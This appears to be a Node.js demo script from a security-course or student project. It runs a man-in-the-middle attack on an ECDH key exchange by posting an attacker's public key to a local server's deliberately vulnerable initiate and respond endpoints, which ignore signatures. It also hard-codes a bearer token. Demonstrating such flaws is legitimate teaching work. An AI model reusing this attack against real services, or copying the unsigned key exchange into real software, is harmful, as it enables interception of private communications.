const crypto = require('crypto');
const axios = require('axios'); // Ensure axios is installed in backend: npm install axios

// Configuration
const API_URL = 'http://localhost:5000/api'; // Or https if enabled
// You need to manually paste valid User IDs here for the demo (from MongoDB or logs)
const VICTIM_USER_ID = '6930398952c83803d57f12d2'; 
const TARGET_USER_ID = '693039a452c83803d57f12f1';
const ATTACKER_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2OTMwMzliNjUyYzgzODAzZDU3ZjEyZjgiLCJ1c2VybmFtZSI6ImV2ZSIsImlhdCI6MTc2NDc2ODE4MywiZXhwIjoxNzY0ODU0NTgzfQ.UsMSIHkVE-6JuLVSgEq7ukL-dlzwpjxV7j4wmpg7i1k'; // Login as attacker and paste token

// Crypto Helpers
function generateECDH() {
  return crypto.createECDH('prime256v1');
}

async function runMITMAttack() {
  console.log('😈 Starting MITM Attack Simulation on Vulnerable Protocol...\n');

  try {
    // 1. Attacker generates their own malicious keys
    const attackerECDH = generateECDH();
    attackerECDH.generateKeys();
    const attackerPublicKey = attackerECDH.getPublicKey('base64');
    console.log('1️⃣ Attacker generated malicious ECDH keys');

    // 2. Attacker intercepts "Initiate" and sends their OWN key instead of Victim's
    console.log('2️⃣ Intercepting Init request and injecting malicious key...');
    const initPayload = {
      responderId: TARGET_USER_ID,
      ephemeralPublic: attackerPublicKey, // MALICIOUS KEY
      nonce: crypto.randomBytes(32).toString('base64'),
      timestamp: Date.now(),
      signature: 'ignored_by_vulnerable_route'
    };

    const initResponse = await axios.post(`${API_URL}/keys/exchange/initiate-vulnerable`, initPayload, {
      headers: { Authorization: `Bearer ${ATTACKER_TOKEN}` }
    });

    const sessionId = initResponse.data.sessionId;
    console.log(`✅ MITM Successful on Init! Session ID: ${sessionId}`);
    console.log('   The server accepted our malicious key because it didn\'t check the signature.\n');

    // 3. Attacker intercepts "Respond"
    console.log('3️⃣ Intercepting Respond request...');
    const respondPayload = {
      sessionId: sessionId,
      ephemeralPublic: attackerPublicKey, // MALICIOUS KEY AGAIN
      nonce: crypto.randomBytes(32).toString('base64'),
      timestamp: Date.now(),
      signature: 'ignored_by_vulnerable_route'
    };

    await axios.post(`${API_URL}/keys/exchange/respond-vulnerable`, respondPayload, {
      headers: { Authorization: `Bearer ${ATTACKER_TOKEN}` }
    });

    console.log('✅ MITM Successful on Respond!');
    console.log('🔥 Result: Attacker has established shared keys with BOTH parties.');
    console.log('   Without signatures, neither party knows they are talking to the attacker.');

  } catch (error) {
    console.error('❌ Attack Failed:', error.response ? error.response.data : error.message);
    console.log('Note: Ensure you updated VICTIM_USER_ID and ATTACKER_TOKEN in the script.');
  }
}

runMITMAttack();